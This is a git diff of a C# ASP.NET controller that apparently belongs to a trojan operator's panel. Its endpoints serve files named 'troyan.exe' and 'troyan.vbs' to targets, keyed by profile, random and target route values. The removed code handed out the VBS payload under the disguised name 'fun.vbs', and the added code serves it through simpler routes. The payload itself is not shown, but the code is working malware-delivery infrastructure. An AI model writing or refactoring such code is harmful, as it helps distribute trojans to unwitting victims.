@@ -1,4 +1,3 @@
-using System.Text;
 using Commons;
 using cp.Models;
 using Domain;
@@ -98,40 +97,18 @@ public class CpController : BaseController
         return GetFile(_serverService.GetExePath(), "troyan.exe");
     }
 
-    private async Task<IActionResult> GetFileAdvanced(string file, string name, string random, string target, string nofile)
-    {
-        try
-        {
-            string fileContent;
-            if (!_memoryCache.TryGetValue(file, out fileContent))
-            {
-                fileContent = await System.IO.File.ReadAllTextAsync(_serverService.Paths.UserDataFile(file));
-                var cacheEntryOptions = new MemoryCacheEntryOptions()
-                    .SetSlidingExpiration(TimeSpan.FromMinutes(1));
-                _memoryCache.Set(file, fileContent, cacheEntryOptions);
-            }
-            var fileBytes = Encoding.UTF8.GetBytes(fileContent);
-            Response.Headers.Add("Content-Type", "text/plain");
-            if (nofile == "nofile")
-                return Ok(fileContent);
-            return File(fileBytes, "text/plain", name.Split(".")[0] + "_" + Environment.TickCount.ToString() + "." + name.Split(".")[1] );
-        }
-        catch (Exception)
-        {
-            return StatusCode(500, "Internal server error");
-        }
-    }
+    [HttpGet("/GetVbs")]
+    public IActionResult GetVbs() => TroyanVbsFromUserData();
 
     [HttpGet("/{profile}/{random}/{target}/GetVbs")]
-    public async Task<IActionResult> GetVbs(string profile, string random, string target)
-    {
-        var ipAddress = IpAddress;
-        if (string.IsNullOrWhiteSpace(ipAddress))
-            return BadRequest("IP address not found.");
-        if (string.IsNullOrWhiteSpace(Server))
-            return BadRequest("Server address not found.");
+    public IActionResult GetVbsLegacy(string profile, string random, string target) => TroyanVbsFromUserData();
 
-        return await GetFileAdvanced("troyan.vbs", "fun.vbs", random, target, "");
+    IActionResult TroyanVbsFromUserData()
+    {
+        var path = _serverService.Layout().UserTroyanVbs;
+        if (!System.IO.File.Exists(path))
+            return NotFound();
+        return PhysicalFile(path, "text/plain", "troyan.vbs");
     }
 
     [HttpPost]
